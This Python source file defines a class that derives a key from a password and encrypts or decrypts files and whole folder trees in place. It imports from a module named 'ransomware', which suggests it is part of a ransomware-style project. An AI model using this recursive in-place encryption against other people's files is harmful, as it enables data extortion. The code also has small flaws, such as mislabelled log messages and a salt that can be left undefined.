
import pathlib, os, secrets, base64, getpass
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import argparse

from ransomware import load_salt


class LockFile:
    def __init__(self):
        print('hehe')

    def generate_salt(self,size=16):
        return secrets.token_bytes(size)

    def derive_key(self,salt, password):
        kdf = Scrypt(salt=salt, length=32, n=2 ** 14, r=8, p=1)
        return kdf.derive(password.encode())

    def load_salt(self):
        try:
            with open("salt.salt", "rb") as file:
                data = file.read()
                return data if data else None
        except FileNotFoundError:
            return None

    def generate_key(self,password, salt_size=16, load_existing_salt=False, save_salt=True):
        if load_existing_salt:
            salt = self.load_salt()
        elif save_salt:
            salt = self.generate_salt(salt_size)
            with open("salt.salt", "wb") as salt_file:
                salt_file.write(salt)
        derived_key = self.derive_key(salt, password)
        # encode it using Base 64 and return it
        return base64.urlsafe_b64encode(derived_key)

    def encrypt(self,filename, key):
        f = Fernet(key)
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)

    def decrypt(self,filename, key):
        f = Fernet(key)
        with open(filename, "rb") as file:
            encrypted_data = file.read()
        try:
            decrypted_data = f.decrypt(encrypted_data)
        except cryptography.fernet.InvalidToken:
            print("[!] Invalid token, most likely the password is incorrect")
            return
        with open(filename, "wb") as file:
            file.write(decrypted_data)

    def encrypt_folder(self,foldername, key):
        for child in pathlib.Path(foldername).glob("*"):
            if child.is_file():
                print(f"[*] Encrypting {child}")
                self.encrypt(child, key)
            elif child.is_dir():
                self.encrypt_folder(child, key)

    def decrypt_folder(self,foldername, key):

        for child in pathlib.Path(foldername).glob("*"):
            if child.is_file():
                print(f"[*] Encrypting {child}")
                self.decrypt(child, key)
            elif child.is_dir():
                self.decrypt_folder(child, key)

    def solve(self,password, option, path):
        salt = load_salt()
        if salt:
           key = self.generate_key(password,load_existing_salt=True)
        else:
           key = self.generate_key(password, save_salt=True)

        if option == "en":
            if os.path.isfile(path):
                self.encrypt(path, key)
            elif os.path.isdir(path):
                # If it is a folder, encrypt the folder
                self.encrypt_folder(path, key)
        elif option == "de":
            if os.path.isfile(path):
                self.decrypt(path, key)
            elif os.path.isdir(path):
                self.decrypt_folder(path, key)

